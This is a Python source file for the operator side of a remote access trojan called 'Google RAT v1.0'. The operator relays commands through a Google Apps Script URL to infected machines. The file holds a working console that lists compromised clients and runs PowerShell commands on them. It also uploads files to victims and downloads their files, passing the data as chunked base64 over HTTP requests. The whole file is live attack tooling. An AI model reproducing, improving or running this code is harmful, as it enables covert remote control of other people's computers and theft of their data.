import os
import base64
import logging
import requests
import argparse
import subprocess

CMD_ID = '@'
UPLOAD_ID = '^'
CHUNK_SIZE = 35000
SIZE_LIMIT = 8500000
LOG_FORMAT = '[%(asctime)s][%(levelname)s] %(message)s'
BANNER = """
*******************************************************************************
Google RAT v1.0
*******************************************************************************
# view help:
python script.py -h
# connect to server
python script.py https://script.google.com/macros/s/dfjlksdf/exec
*******************************************************************************
"""

class Shell(object):
  BANNER = """
          ___
    . -^   `--,
   /# =========`-_      +-+-+-+-+ +-+-+ +-+-+-+-+ +-+-+-+ +-+-+-+
  /# (--====___====\    |S|H|O|W| |M|E| |W|H|A|T| |Y|O|U| |G|O|T|
 /#   .- --.  . --.|    +-+-+-+-+ +-+-+ +-+-+-+-+ +-+-+-+ +-+-+-+
/##   |  * ) (   * ),                         Author: Aaron Reyes
|##   \    /\ \   / |
|###   ---   \ ---  |
|####      ___)    #|   Type 'help' for a list of commands
|######           ##|
 \##### ---------- /
  \####           (
   `\###          |
     \###         |
      \##        |
       \###.    .)
        `======/
  """

  def __init__(self, srv):
    self.srv = srv
    self.hosts = []
    logging.info('connecting to {}'.format(self.srv))
    r = requests.get(args.srv)
    if r.status_code != requests.codes.ok:
      logging.error('server not responding. response: {0}'.format(r.status_code))
    else:
      logging.info('success. server is up!')
    print(self.BANNER)

  def __e(self, d):
    return base64.b64encode(d.encode('UTF-8')).decode('UTF-8')

  def __u(self, ip):
    if ip in [d['ip'] for d in self.hosts]:
      return [d['user'] for d in self.hosts if d['ip'] == ip][0]
    else:
      return ''

  def __r(self, ip, user, d, d_type):
    if len(d) > SIZE_LIMIT:
      logging.error('data size {0}B is beyond size limit of {1}B'.format(len(d), SIZE_LIMIT))
      return ''
    s = ip + '|' + user
    dx = base64.b64encode(d).decode('UTF-8')
    # wait to send data
    while True:
      r = requests.get(self.srv, params={'TxR': '{0}'.format(self.__e(s))})
      if r.status_code != requests.codes.ok:
        logging.error('TxR GET request failed: {0}'.format(r.status_code))
        return ''
      logging.info('TxR: {0}'.format(r.content.decode('UTF-8')))
      if r.content.decode('UTF-8') == '0':
        break
    # send data
    col = 3
    for i in range(0, len(dx), CHUNK_SIZE):
      r = requests.post(self.srv, params={'Tx': '{0}'.format(self.__e(''.join([s, '|', str(col)])))}, data={'d': dx[i:i+CHUNK_SIZE]})
      if r.status_code != requests.codes.ok:
        logging.error('Tx POST request failed: {0}'.format(r.status_code))
        return ''
      logging.info('TxD[{0}]: {1}'.format(col - 3, dx[i:i+CHUNK_SIZE]))
      col = col + 1
    # set data type
    r = requests.post(self.srv, params={'Tx': '{0}'.format(self.__e(''.join([s, '|2'])))}, data={'d': d_type})
    if r.status_code != requests.codes.ok:
      logging.error('Tx POST request failed: {0}'.format(r.status_code))
      return ''
    # wait to get data
    while True:
      r = requests.get(self.srv, params={'RxR': '{0}'.format(self.__e(s))})
      if r.status_code != requests.codes.ok:
        logging.error('RxR GET request failed: {0}'.format(r.status_code))
        return ''
      logging.info('RxR: {0}'.format(r.content.decode('UTF-8')))
      if r.content.decode('UTF-8') == '1':
        break
    # download data
    col = 3
    buf = []
    while True:
      r = requests.get(self.srv, params={'RxD': '{0}'.format(self.__e(''.join([s, '|', str(col)])))})
      if r.status_code != requests.codes.ok:
        logging.error('RxD GET request failed: {0}'.format(r.status_code))
        return ''
      if r.content.decode('UTF-8') == '':
        break
      logging.info('RxD[{0}]: {1}'.format(col - 3, r.content.decode('UTF-8')))
      buf.append(r.content.decode('UTF-8'))
      col = col + 1
    # ACK download of data
    r = requests.post(self.srv, params={'Rx': '{0}'.format(self.__e(''.join([s, '|2'])))}, data={'d': '0'})
    if r.status_code != requests.codes.ok:
      logging.error('Rx POST request failed: {0}'.format(r.status_code))
      return ''
    # return array of chunked data
    return buf

  def help(self):
    print('ls                   - list all active clients')
    print('run      <cmd>       - run command locally')
    print('shell    <ip>        - run powershell commands on <ip>')
    print('upload   <ip> <file> - upload local <file> to <ip>')
    print('download <ip> <file> - download remote <file> from <ip>')
    print('quit                 - exit')

  def ls(self):
    r = requests.get(self.srv, params={'ls': ''})
    if r.status_code != requests.codes.ok:
      logging.error('failed to execute "ls" command. response: {0}'.format(r.status_code))
    else:
      hosts = []
      raw = r.content.decode('UTF-8').split('|')
      for ip,user in zip(raw[0::2], raw[1::2]):
        if ip and user:
          hosts.append({'ip': ip, 'user': user})
          logging.info('client found: {0}@{1}'.format(user, ip))
      if not hosts:
        logging.info('no hosts found')
      self.hosts = hosts

  def run(self, cmd):
    try:
      print(subprocess.check_output(cmd.split(' ')).decode('UTF-8'))
    except:
      logging.error('failed to run command: {0}'.format(cmd))

  def shell(self, ip):
    logging.info('enter "quit" to exit shell')
    if not self.hosts:
      logging.error('no hosts loaded. try running "ls"')
      return
    user = self.__u(ip)
    if not user:
      logging.error('invalid ip: {0}'.format(ip))
      return
    while True:
      cmd = input('{0}@{1} PS> '.format(user, ip)).lower()
      if cmd in ['e', 'q', 'exit', 'quit']:
        logging.info('exiting shell on {0}'.format(ip))
        break
      if cmd.strip():
        d = self.__r(ip, user, cmd.encode('UTF-16LE'), CMD_ID)
        print(''.join([base64.b64decode(c).decode('UTF-8') for c in d]))

  def upload(self, ip, path):
    if not self.hosts:
      logging.error('no hosts loaded. try running "ls"')
      return
    user = self.__u(ip)
    if not user:
      logging.error('invalid ip: {0}'.format(ip))
      return
    try:
      with open(path, 'rb') as f:
        d = self.__r(ip, user, f.read(), os.path.basename(path))
        print(''.join([base64.b64decode(c).decode('UTF-8') for c in d]))
    except:
      logging.error('failed to send file: {0}'.format(path))

  def download(self, ip, path):
    if not self.hosts:
      logging.error('no hosts loaded. try running "ls"')
      return
    user = self.__u(ip)
    if not user:
      logging.error('invalid ip: {0}'.format(ip))
      return
    try:
      with open(path, 'wb') as f:
        d = self.__r(ip, user, path.encode('UTF-8'), UPLOAD_ID)
        f.write(b''.join([base64.b64decode(c) for c in d]))
      print('SUCCESS')
    except:
      logging.error('failed to download file: {0}'.format(path))

if __name__ == '__main__':
  # parse user arguments
  parser = argparse.ArgumentParser(usage=BANNER)
  parser.add_argument('srv', help='google apps server URL', type=str)
  parser.add_argument('-l', dest='logging_level', default='INFO', help='logging level for output', type=str)
  args = parser.parse_args()
  # setup logger
  logging.basicConfig(format=LOG_FORMAT, datefmt='%d %b %Y %H:%M:%S', level=args.logging_level)
  # create user shell
  sh = Shell(args.srv)
  # accept user input for hosts
  while True:
    c = input('> ').lower()
    if c == 'help':
      sh.help()
    if c == 'ls':
      sh.ls()
    if c.startswith('run'):
      sh.run(c.replace('run', '').strip())
    if c.startswith('shell'):
      sh_args = c.replace('shell', '').strip().split(' ')
      if len(sh_args) != 1:
        logging.error('invalid arguments. run "help"')
        continue
      sh.shell(sh_args[0])
    if c.startswith('upload'):
      sh_args = c.replace('upload', '').strip().split(' ')
      if len(sh_args) != 2:
        logging.error('invalid arguments. run "help"')
        continue
      sh.upload(sh_args[0], sh_args[1])
    if c.startswith('download'):
      sh_args = c.replace('download', '').strip().split(' ')
      if len(sh_args) != 2:
        logging.error('invalid arguments. run "help"')
        continue
      sh.download(sh_args[0], sh_args[1])
    if c in ['e', 'q', 'exit', 'quit']:
      break
